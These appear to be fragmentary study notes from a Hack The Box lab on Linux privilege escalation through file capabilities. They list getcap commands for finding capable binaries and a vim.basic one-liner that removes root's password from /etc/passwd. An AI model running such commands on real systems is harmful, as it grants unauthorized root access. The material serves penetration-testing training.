...
Capabilities are a set of privileges set on processes, sometimes these processes arent properly sandboxed or isolated and this allows us to privesc pretty easily
...
// Seeing what capabilities we have
getcap
getcap /usr/bin/vim.basic

// ------------------------------------------ Exploiting Capabilities  ------------------------------------------ //

// cap_dac_override=eip + vim
...
```shell-session
Hillside_1@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```
...
```shell-session
Hillside_1@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
...
```shell-session
Hillside_1@htb[/htb]$ getcap /usr/bin/vim.basic
...
```shell-session
Hillside_1@htb[/htb]$ cat /etc/passwd | head -n1
...
```shell-session
Hillside_1@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```
...
```shell-session
Hillside_1@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
Hillside_1@htb[/htb]$ cat /etc/passwd | head -n1
